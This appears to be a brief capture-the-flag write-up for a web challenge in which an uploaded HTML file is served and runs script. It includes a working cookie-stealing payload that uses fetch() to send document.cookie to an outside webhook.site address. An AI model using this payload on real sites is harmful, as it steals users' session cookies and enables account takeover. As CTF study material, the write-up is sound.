+ uploading an html file with the following contents and accessing it via `/uploads/uuid` will give you an alert
```htm
<html>
    <script>
        alert(1)
    </script>
</html>
```
+ https://d1kesanhfxrlwb.cloudfront.net/upload/b6393ef3-c4e6-4344-9253-65978f60a39a
+ The flag is in cookie. 
+ We can upload the html file with the script to fetch the cookie:
```html
<html>
    <script>
    fetch("https://webhook.site/854bcf28-af51-4e24-99f8-b58cac657ab3?cookie=" + document.cookie);
    </script>
</html>
```
And thus we get the flag!